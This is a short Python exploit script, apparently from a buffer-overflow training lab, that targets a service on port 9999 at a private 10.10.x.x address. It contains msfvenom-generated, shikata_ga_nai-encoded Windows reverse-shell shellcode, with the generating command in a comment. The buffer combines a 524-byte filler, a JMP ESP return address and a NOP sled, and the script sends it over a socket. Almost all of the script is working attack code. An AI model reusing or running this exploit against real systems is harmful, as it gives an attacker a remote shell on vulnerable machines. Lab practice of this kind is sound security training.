#!/usr/bin/python3

import sys, socket
from time import sleep

#badchars = /x00

#msfvenom -p windows/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"

payload = ("\xd9\xc3\xd9\x74\x24\xf4\xba\xb6\xdb\x55\x9a\x5d\x31\xc9\xb1"
"\x52\x83\xed\xfc\x31\x55\x13\x03\xe3\xc8\xb7\x6f\xf7\x07\xb5"
"\x90\x07\xd8\xda\x19\xe2\xe9\xda\x7e\x67\x59\xeb\xf5\x25\x56"
"\x80\x58\xdd\xed\xe4\x74\xd2\x46\x42\xa3\xdd\x57\xff\x97\x7c"
"\xd4\x02\xc4\x5e\xe5\xcc\x19\x9f\x22\x30\xd3\xcd\xfb\x3e\x46"
"\xe1\x88\x0b\x5b\x8a\xc3\x9a\xdb\x6f\x93\x9d\xca\x3e\xaf\xc7"
"\xcc\xc1\x7c\x7c\x45\xd9\x61\xb9\x1f\x52\x51\x35\x9e\xb2\xab"
"\xb6\x0d\xfb\x03\x45\x4f\x3c\xa3\xb6\x3a\x34\xd7\x4b\x3d\x83"
"\xa5\x97\xc8\x17\x0d\x53\x6a\xf3\xaf\xb0\xed\x70\xa3\x7d\x79"
"\xde\xa0\x80\xae\x55\xdc\x09\x51\xb9\x54\x49\x76\x1d\x3c\x09"
"\x17\x04\x98\xfc\x28\x56\x43\xa0\x8c\x1d\x6e\xb5\xbc\x7c\xe7"
"\x7a\x8d\x7e\xf7\x14\x86\x0d\xc5\xbb\x3c\x99\x65\x33\x9b\x5e"
"\x89\x6e\x5b\xf0\x74\x91\x9c\xd9\xb2\xc5\xcc\x71\x12\x66\x87"
"\x81\x9b\xb3\x08\xd1\x33\x6c\xe9\x81\xf3\xdc\x81\xcb\xfb\x03"
"\xb1\xf4\xd1\x2b\x58\x0f\xb2\x59\x94\xb6\x2a\x36\xa4\xc8\xbb"
"\x9a\x21\x2e\xd1\x32\x64\xf9\x4e\xaa\x2d\x71\xee\x33\xf8\xfc"
"\x30\xbf\x0f\x01\xfe\x48\x65\x11\x97\xb8\x30\x4b\x3e\xc6\xee"
"\xe3\xdc\x55\x75\xf3\xab\x45\x22\xa4\xfc\xb8\x3b\x20\x11\xe2"
"\x95\x56\xe8\x72\xdd\xd2\x37\x47\xe0\xdb\xba\xf3\xc6\xcb\x02"
"\xfb\x42\xbf\xda\xaa\x1c\x69\x9d\x04\xef\xc3\x77\xfa\xb9\x83"
"\x0e\x30\x7a\xd5\x0e\x1d\x0c\x39\xbe\xc8\x49\x46\x0f\x9d\x5d"
"\x3f\x6d\x3d\xa1\xea\x35\x5d\x40\x3e\x40\xf6\xdd\xab\xe9\x9b"
"\xdd\x06\x2d\xa2\x5d\xa2\xce\x51\x7d\xc7\xcb\x1e\x39\x34\xa6"
"\x0f\xac\x3a\x15\x2f\xe5")

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
nops = "\x90" * 32
buffer = filler + EIP + offset + nops + payload

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.215.180",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
